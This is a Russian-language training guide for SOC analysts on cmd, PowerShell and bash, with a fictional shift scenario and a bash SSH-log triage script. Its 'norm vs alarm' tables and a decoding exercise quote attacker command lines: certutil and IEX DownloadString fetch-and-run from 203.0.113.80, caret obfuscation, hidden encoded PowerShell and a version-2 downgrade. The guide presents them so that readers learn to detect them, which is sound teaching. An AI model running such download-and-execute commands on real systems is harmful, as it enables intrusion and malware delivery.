Учебник: Command Line

Модуль: Cyber Security 101 · Комнаты: Windows Command Line, Windows PowerShell, Linux Shells.

Что будешь уметь после учебника:

  • в cmd быстро узнать, что за машина, с кем она говорит и что на ней запущено;
  • читать PowerShell как конвейер объектов и собирать короткие команды для тикета;
  • раскодировать powershell -enc … и понять, что делала команда атакующего;
  • писать короткие bash-скрипты, которые делают рутину смены за тебя;
  • отличать нормальную командную строку админа от командной строки атакующего.

Маршрут:

  • 🤔 Windows Command Line — по желанию: команды простые, всё есть в главе 1. Но это живая Windows по SSH — если время есть, набери их руками. ~45 мин [1].
  • 🧪 Windows PowerShell — пройди: командлеты для учёток, служб и сети работают только в Windows, на маке их нет. ~60 мин [2].
  • 🤔 Linux Shells — по желанию: bash и zsh есть на маке, всё из комнаты повторишь в своём Терминале по главе 3. ~45 мин [3].
  • Главы: 3 обязательных 🔥.

Повторы с прошлыми учебниками я убрал. grep, пайпы и .bash_history — в Linux Fundamentals. netstat -ano, Event Viewer и норма процессов Windows — в учебнике Windows и AD. Здесь только ссылки на них.

Пролог: тикет перед концом смены

21:10, Spätschicht, учебная фирма Nordstern Logistik GmbH (выдуманная). До конца смены 50 минут. В очереди три тикета: алерт про PowerShell со странной длинной строкой на WS-DISPO-03, просьба L2 «пришли быстро сведения о машине» и ночной syslog с файлового сервера, который никто не смотрел.

Всё это делается в командной строке. Глава 1 — cmd, глава 2 — PowerShell, глава 3 — bash и скрипты. В практике ты закроешь все три тикета.

Глава 1. Windows Command Line (cmd)

🔥Обязательно — cmd встречается почти в каждом алерте на Windows: его запускает и админ, и атакующий
🤔
По желанию Windows Command Line — команды простые, вся комната есть в главе. Но это живая Windows, которой на маке нет. ~45 мин [1].

Аналогия

cmd — это фонарик дежурного. Он не освещает весь склад, как прожектор PowerShell. Зато он есть на любой Windows, включается мгновенно, и на нём не надо ничего настраивать. Для «быстро посмотреть» его хватает.

Ты на смене

L2 пишет: «На WS-DISPO-03 есть консоль EDR, графики нет. Пришли имя машины, версию Windows, адреса и что сейчас запущено». Пять минут.

Где ты и что за машина

Зачем: первая команда на чужой машине — проверить, что ты на нужной.

hostname            :: имя машины
whoami              :: под какой учёткой ты работаешь
ver                 :: версия Windows одной строкой
systeminfo          :: паспорт: версия, сборка, домен, обновления, время загрузки
set                 :: переменные окружения
help                :: список команд; help dir — справка по одной
cls                 :: очистить экран

:: — комментарий в cmd. У любой команды подсказка — команда /? [4].

Пример systeminfo (учебный, сокращён):

Host Name:                 WS-DISPO-03
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.26100 N/A Build 26100
Domain:                    nordstern.local
System Boot Time:          14.09.2026, 06:58:12
Hotfix(s):                 3 Hotfix(s) Installed.

Для тикета важно: версия и сборка (стоят ли обновления), домен и время загрузки. Если машина перезагружалась ровно во время инцидента — это стоит записать.

Где ошибаются новички: запускают systeminfo и копируют в тикет все 60 строк. L2 нужны пять: имя, версия, сборка, домен, время загрузки.

Сеть: адреса, ping, маршрут, DNS

Зачем: «с кем говорит машина» — второй вопрос в любом тикете.

Команда Что делает Когда понадобится
ipconfig /all адреса, DNS-серверы, MAC в тикет: какой у машины адрес на момент алерта
ping 10.0.5.12 доступна ли машина проверить, жив ли хост, прежде чем звать L2
tracert 10.0.5.12 через какие узлы идёт путь редко; чаще у админов
nslookup files.example во что домен превращается в адрес проверить домен из алерта: куда он ведёт сейчас
netstat -ano соединения и PID процесса кто из процессов говорит с внешним адресом

netstat -ano и как найти процесс по PID разобраны в учебнике Windows и AD, глава 2 [5].

Пример nslookup (учебный):

Server:   fue-dc01.nordstern.local
Address:  192.168.20.10

Non-authoritative answer:
Name:     files.example
Address:  203.0.113.80

Первые две строки — какой DNS-сервер ответил. Ниже — ответ: домен ведёт на 203.0.113.80. Этот адрес ты потом ищешь в других алертах.

Файлы: посмотреть, ничего не сломав

Зачем: на смене ты файлы читаешь, а не меняешь. Но команды изменения надо узнавать в логах атакующего.

Команда Что делает Когда увидишь
cd, dir, tree перейти, список, дерево каталогов dir /s /b *.kdbx — атакующий ищет файлы паролей
dir /a показать и скрытые файлы ты ищешь спрятанное в C:\Users\Public
mkdir, rmdir создать, удалить папку mkdir C:\ProgramData\wuhelp — папка под файлы атакующего
findstr "текст" файл найти строку в файле, как grep ты ищешь адрес в выгруженном логе
type файл, more файл вывести файл, постранично ты читаешь конфиг или лог
copy, move скопировать, переместить перенос инструментов в C:\Users\Public
del, erase, rmdir /s удалить атакующий заметает следы
*, ? подстановки: любые символы, один символ del *.log — массовое удаление

dir /s — искать во всех подпапках, /b — только пути, без шапки, /a — со скрытыми и системными [6].

Где ошибаются новички: набирают del в консоли EDR, чтобы «убрать вредонос». Улики не удаляют: это решает L2, и файл нужен для анализа.

Процессы: tasklist и taskkill

Зачем: быстрый список процессов без EDR.

tasklist
tasklist /fi "imagename eq powershell.exe"
tasklist /fi "PID eq 6120" /v

/fi — фильтр, eq — «равно», /v — подробно, с учёткой [7]. Пример (учебный):

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
powershell.exe                6120 Console                    1     88 412 K

Службы смотрят sc query — список служб и их состояние.

taskkill /PID 6120 /F завершает процесс. На смене ты его не запускаешь: убитый процесс — потерянные улики в памяти.

Обслуживание: shutdown, chkdsk, driverquery, sfc

Это есть в комнате, а в SOC встречается редко:

  • shutdown /r /t 0 — перезагрузить сейчас, /s — выключить, /a — отменить. Неожиданная перезагрузка сервера ночью — повод спросить, кто это сделал.
  • chkdsk C: — проверить диск на ошибки.
  • driverquery — список драйверов. Пригодится, если подозревают вредоносный драйвер.
  • sfc /scannow — проверить и восстановить системные файлы Windows. Нужны права администратора [8].

Норма и тревога: командные строки cmd

Зачем: это тема «За рамками THM» в этом учебнике. EDR показывает тебе командные строки. Надо с первого взгляда отличать админа от атакующего.

Норма Тревога Почему
cmd.exe от explorer.exe — человек открыл консоль cmd.exe от WINWORD.EXE, EXCEL.EXE, outlook.exe офис не запускает оболочку
ipconfig /all от helpdesk whoami & hostname & ipconfig /all & net user подряд, за секунду так выглядит автоматическая разведка (T1082, T1033, T1016)
certutil -verify — проверка сертификата certutil -urlcache -f http://203.0.113.80/a.exe a.exe certutil используют как скачивалку (T1105)
обычный текст команды c^m^d /c p^o^w^e^r^s^h^e^l^l ^ в cmd — экранирование: команда та же, но поиск по слову её не ловит (T1027.010)

Программы Windows, которые атакующие используют не по назначению, называют LOLBins (living off the land). Они подписаны Microsoft и есть на любой машине, поэтому их запуск сам по себе не вызывает подозрений. Список с примерами ведёт проект LOLBAS [9].

В EDR командная строка «c^e^r^t^u^t^i^l -urlcache -f http://203.0.113.80/x.exe x.exe». Что здесь происходит?

Как сказать на смене

  • «Der Host heißt WS-DISPO-03, Windows 11 Build 26100, zuletzt neu gestartet um 06:58.» — Хост WS-DISPO-03, Windows 11, сборка 26100, последняя перезагрузка в 06:58.
  • «certutil wurde zum Herunterladen einer Datei missbraucht.» — certutil использовали для скачивания файла.

Термины

EN RU DE
command prompt командная строка Eingabeaufforderung
environment variable переменная окружения Umgebungsvariable
name resolution разрешение имени (DNS) Namensauflösung
living off the land использование встроенных программ Living off the Land
obfuscation запутывание Verschleierung

Выжимка

  • hostname, whoami, systeminfo, ipconfig /all — паспорт машины для тикета за минуту.
  • nslookup домен — куда ведёт домен из алерта; tasklist /fi — найти процесс без EDR.
  • На смене ты не удаляешь файлы и не убиваешь процессы: это улики.
  • Тревога: cmd от офиса, пачка разведчиков за секунду, certutil -urlcache, ^ внутри слов.

Связи

  • Windows и AD, глава 2: netstat -ano, журналы и норма процессов.
  • SOC Level 1: эти командные строки ищутся в Sysmon и EDR.

Глава 2. Windows PowerShell

🔥Обязательно — PowerShell — главный инструмент и админов, и атакующих на Windows
🧪
Пройди Windows PowerShell — командлеты для учёток, служб и сети работают только в Windows. Прочитай главу → пройди комнату → вернись к практике. ~60 мин [2].

Аналогия

cmd и bash передают по трубе текст, как факс: на другом конце надо разбирать строки ножницами (cut, grep -o). PowerShell передаёт объекты — как коробки с подписанными полками: «имя», «PID», «процессор». Следующей команде не надо ничего вырезать, она просто берёт нужную полку.

Ты на смене

Алерт с WS-DISPO-03: «Учебный алерт: powershell.exe -nop -w hidden -enc SQBFAFgAIAAo…». Строка длинная и нечитаемая. Чтобы понять её, надо знать, как устроен PowerShell и что он о себе пишет в журнал.

Два PowerShell: 5.1 и 7

Зачем: в журналах ты увидишь оба, и это разные программы.

  • Windows PowerShell 5.1 — powershell.exe, встроен в Windows, построен на .NET Framework. Больше не развивается, но есть везде.
  • PowerShell 7 — pwsh.exe, ставится отдельно, работает на Windows, Linux и macOS [10].

Атакующие чаще запускают powershell.exe: он гарантированно есть. Командлеты в обоих почти одинаковые.

Как читать любую команду: Глагол-Существительное

Зачем: команд тысячи, но все названы по одной схеме. Поняв схему, ты прочитаешь незнакомую команду.

Команда PowerShell называется командлет (cmdlet) и строится как Глагол-Существительное [11]:

  • Get-Process — получить процессы;
  • Stop-Service — остановить службу;
  • New-LocalUser — создать локальную учётку.

Три команды, чтобы разбираться самому:

Get-Help Get-Process -Examples     # справка с примерами
Get-Command -Noun Service          # какие команды работают со службами
Get-Alias dir                      # dir — это псевдоним Get-ChildItem

Командлеты собраны в модули. Найти и поставить модуль из открытой галереи: Find-Module имя, Install-Module имя [12]. Неожиданный Install-Module на рабочей станции бухгалтера — повод спросить: так ставят и инструменты атакующих.

Псевдонимы (aliases) — короткие имена: dir, ls → Get-ChildItem, cat → Get-Content, cd → Set-Location. Атакующие любят их за краткость: iex — это Invoke-Expression, «выполни строку как код».

Объекты и конвейер

Зачем: это главное отличие PowerShell. Поняв конвейер, ты соберёшь любую выборку для тикета.

Каждый командлет выдаёт объекты. Посмотреть, какие у объекта поля:

Get-Process | Get-Member -MemberType Property

Дальше четыре командлета для обработки, они встретятся везде [13]:

Командлет Что делает Аналог в bash
Where-Object CPU -gt 60 оставить объекты по условию grep
Sort-Object CPU -Descending отсортировать sort -rn
Select-Object -First 5 Name, Id оставить нужные поля и число cut + head
Group-Object Name сгруппировать и посчитать sort | uniq -c

Операторы сравнения: -eq равно, -ne не равно, -gt больше, -ge больше или равно, -lt меньше, -le меньше или равно, -like — похоже по шаблону со * [14].

Чем Get-Process | Select-Object -First 5 Name отличается от ps aux | head -5?

Файлы и поиск в тексте

Зачем: те же задачи, что в cmd и bash, но объектами.

Set-Location C:\Users\m.becker\Downloads
Get-ChildItem -File | Sort-Object LastWriteTime -Descending | Select-Object -First 5 Name, Length, LastWriteTime
Get-Content .\notes.txt -TotalCount 20               # первые 20 строк
Select-String -Path C:\Logs\*.log -Pattern "Failed"  # аналог grep

Ещё в комнате: New-Item (создать файл или папку), Copy-Item, Move-Item, Remove-Item. Как и в cmd — на смене ты их не запускаешь, но узнаёшь в логах.

Система, учётки, сеть и хэши

Зачем: это паспорт машины, но сразу объектами, которые можно отфильтровать.

Командлет Что показывает Пример для тикета
Get-ComputerInfo версия, сборка, домен Get-ComputerInfo | Select OsName, OsBuildNumber, CsDomain
Get-LocalUser локальные учётки Get-LocalUser | Where Enabled — включённые
Get-NetIPConfiguration адреса и DNS то же, что ipconfig /all
Get-NetIPAddress все адреса всех интерфейсов Get-NetIPAddress -AddressFamily IPv4
Resolve-DnsName DNS-запрос, как nslookup Resolve-DnsName files.example
Get-Process процессы Get-Process | Sort CPU -Desc | Select -First 5
Get-Service службы Get-Service | Where Status -eq Running
Get-NetTCPConnection соединения TCP Get-NetTCPConnection -State Established [15]
Get-FileHash хэш файла (по умолчанию SHA-256) для тикета и VirusTotal [16]

Where Enabled — короткая форма Where-Object Enabled -eq $true. Sort, Select, Where — псевдонимы полных имён.

Пример (учебный):

Get-NetTCPConnection -State Established | Where RemoteAddress -notlike "192.168.*" | Select LocalPort, RemoteAddress, RemotePort, OwningProcess

LocalPort RemoteAddress RemotePort OwningProcess
--------- ------------- ---------- -------------
    50532 203.0.113.80         443          6120

Все внешние соединения и номер процесса. -notlike "192.168.*" — «не похоже на», * — любые символы.

Скрипты, политика выполнения и удалённый запуск

Зачем: в журналах ты увидишь, как PowerShell запускает файлы и команды на других машинах.

  • Скрипт — файл .ps1. Запуск: .\script.ps1.
  • Политика выполнения (Execution Policy) решает, можно ли запускать скрипты. Microsoft прямо пишет: это не граница безопасности, а защита от случайного запуска [17]. -ExecutionPolicy Bypass в командной строке обходит её одним флагом — обычное дело у атакующих.
  • Invoke-Command -ComputerName FUE-FS01 -ScriptBlock { Get-Service } — выполнить команду на другой машине. Работает через WinRM, порты 5985 (HTTP) и 5986 (HTTPS) [18]. На целевой машине команды выполняет процесс wsmprovhost.exe [19]. Это боковое перемещение, T1021.006 [20].

Что PowerShell пишет о себе

Зачем: если PowerShell запускали, следы почти всегда есть. Надо знать, где.

Журнал / событие Что в нём Нужна настройка?
Security 4688 запуск powershell.exe и его командная строка да, аудит и отдельная политика для командной строки
PowerShell Operational 4104 текст скрипта, уже раскодированный Script Block Logging; подозрительные блоки PowerShell 5+ пишет и без неё [21]
PowerShell Operational 4103 вызовы командлетов с параметрами Module Logging
Sysmon 1 запуск процесса, родитель, командная строка, хэш да, Sysmon

Главное: в 4104 уже лежит раскодированный текст. Даже если в командной строке было -enc …, 4104 покажет, что выполнялось на самом деле.

Норма и тревога: командные строки PowerShell

Норма Тревога Почему
powershell.exe от explorer.exe у админа от WINWORD.EXE, wmiprvse.exe, mshta.exe PowerShell запустил не человек
-File C:\Scripts\backup.ps1 -enc SQBFAFgA… код спрятан в base64 (T1027)
обычное окно -nop -w hidden без профиля и со скрытым окном — чтобы человек не увидел
Get-Service IEX (New-Object Net.WebClient).DownloadString('http://…') скачать скрипт и сразу выполнить в памяти: файла на диске нет (T1105, T1059.001)
powershell.exe powershell -version 2 старая версия без логирования — даунгрейд, T1689 (раньше T1562.010)

-enc (полностью -EncodedCommand) принимает команду в base64, причём текст сначала записан в кодировке UTF-16LE [22]. Поэтому при раскодировании обычным base64 между буквами видны нули или точки. Как раскодировать самому — задание 4 в практике.

Глава 3. Linux Shells и скрипты

🔥Обязательно — скрипт, который за тебя считает лог, экономит время каждую смену
🤔
По желанию Linux Shells — bash и zsh есть на маке, всё из комнаты повторишь в своём Терминале по этой главе. Комнату можно пройти для галочки. ~45 мин [3].

Аналогия

Оболочка (shell) — переводчик между тобой и ядром. Ты говоришь на языке команд, ядро понимает только системные вызовы. Переводчиков несколько, у каждого свой характер, но смысл передают все.

Скрипт — это записанная речь: ты один раз продиктовал, а переводчик повторяет её сколько угодно раз.

Ты на смене

Каждую смену ты делаешь одно и то же: считаешь неудачные входы, ищешь топ адресов, проверяешь удачные входы. Десять минут на каждый сервер. Пора поручить это скрипту.

Какие бывают оболочки

Зачем: в логах и на серверах ты встретишь разные оболочки. Надо понимать, какая перед тобой.

Оболочка Где встретишь Чем отличается
bash почти все Linux-серверы стандарт; скрипты пишут под него
zsh macOS по умолчанию с Catalina (2019) [23] удобнее в работе, автодополнение, темы
fish у энтузиастов подсказки «из коробки», но синтаксис не как у bash
sh (dash) системные скрипты Debian/Ubuntu минимальная и быстрая

Как узнать и сменить [24]:

echo $SHELL        # оболочка по умолчанию
cat /etc/shells    # какие оболочки установлены
chsh -s /bin/zsh   # сменить оболочку по умолчанию

На маке у тебя zsh, но bash тоже есть: скрипты из главы работают в обоих.

Ещё три команды для паспорта Linux-машины: uname -a — версия ядра, ip a — адреса, dig домен — DNS-запрос, как nslookup.

Первый скрипт: shebang, переменные, аргументы

Зачем: из этих четырёх кусков собирается любой полезный скрипт.

#!/bin/bash
# hello.sh — первый скрипт
name="Илья"
echo "Привет, $name"
echo "Ты передал файл: $1"

Разбор:

  • #!/bin/bash — shebang, первая строка: какой оболочкой выполнять файл;
  • # — комментарий;
  • name="Илья" — переменная. Без пробелов вокруг =, иначе bash решит, что name — команда;
  • $name — подставить значение переменной;
  • $1 — первый аргумент, который передали скрипту при запуске; $0 — имя самого скрипта.

Запуск:

chmod +x hello.sh          # сделать исполняемым (права из Linux Fundamentals, глава 3)
./hello.sh OpenSSH_2k.log

Привет, Илья
Ты передал файл: OpenSSH_2k.log

read спрашивает у человека: read -p "Имя файла: " log запишет ответ в переменную log.

Где ошибаются новички: пишут name = "Илья" с пробелами и получают «command not found».

Условия, циклы, коды выхода

Зачем: скрипт должен сам решать, что делать, и проверять ошибки.

Условие if:

if [ ! -f "$log" ]; then
  echo "Нет такого файла: $log"
  exit 2
fi

[ … ] — проверка. -f — «файл существует», ! — «не», -z — «пустая строка», -gt — «больше» для чисел. Пробелы внутри скобок обязательны.

Ветки и несколько условий:

if [ "$failed" -gt 100 ] && [ "$accepted" -gt 0 ]; then
  echo "Перебор И удачный вход — проверить срочно"
elif [ "$failed" -gt 100 ]; then
  echo "Перебор без удачных входов"
else
  echo "Спокойно"
fi

&& — «и»: оба условия верны. || — «или»: хотя бы одно. elif — «а если нет, то проверь вот это». else — «во всех остальных случаях». На нашем логе выполнится первая ветка: 520 неудач и один удачный вход.

Цикл for — повторить для каждого значения:

for user in root admin test; do
  echo "Проверяю $user"
done

Подстановка команды $(…) — выполнить команду и взять её вывод как значение:

failed=$(grep -c "Failed password" "$log")

Код выхода: каждая команда, завершаясь, возвращает число. 0 — успех, всё остальное — ошибка. exit 2 в скрипте задаёт его самому. Посмотреть код последней команды: echo $?.

Кавычки вокруг "$log" нужны, чтобы имя файла с пробелом не развалилось на два аргумента.

Собираем скрипт для смены

Вот скрипт, который делает рутину из учебника Linux за секунду. Я прогнал его на настоящем OpenSSH_2k.log — вывод ниже настоящий.

#!/bin/bash
# ssh_triage.sh — короткий отчёт по логу SSH
log="$1"

if [ -z "$log" ]; then
  echo "Использование: $0 файл_лога"
  exit 1
fi
if [ ! -f "$log" ]; then
  echo "Нет такого файла: $log"
  exit 2
fi

failed=$(grep -c "Failed password" "$log")
accepted=$(grep -c "Accepted" "$log")

echo "Файл: $log"
echo "Неудачных входов: $failed"
echo "Удачных входов:   $accepted"

if [ "$failed" -gt 100 ]; then
  echo "ВНИМАНИЕ: больше 100 неудач — похоже на перебор"
fi

echo "Попытки по учёткам:"
for user in root admin test oracle; do
  n=$(grep "Failed password" "$log" | grep -cE "for (invalid user )?$user ")
  echo "  $user: $n"
done

echo "Топ-3 адреса:"
grep "Failed password" "$log" | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn | head -3

Задание 4. Раскодируй команду атакующего

Раскодируй её в Терминале мака:

base64 -D раскодирует base64 (на Linux флаг -d). iconv переводит текст из UTF-16LE, в которой PowerShell записывает команду перед кодированием, в обычную UTF-8. Вставь строку целиком вместо SQBFAFgA….

Ключ

Скачивает скрипт a.ps1 с 203.0.113.80 и сразу выполняет его в памяти (IEX = Invoke-Expression). Файл на диск не ложится.

Без iconv ты увидишь текст с точками или пустотами между буквами: это нулевые байты UTF-16LE. Так и узнают закодированную PowerShell-команду.
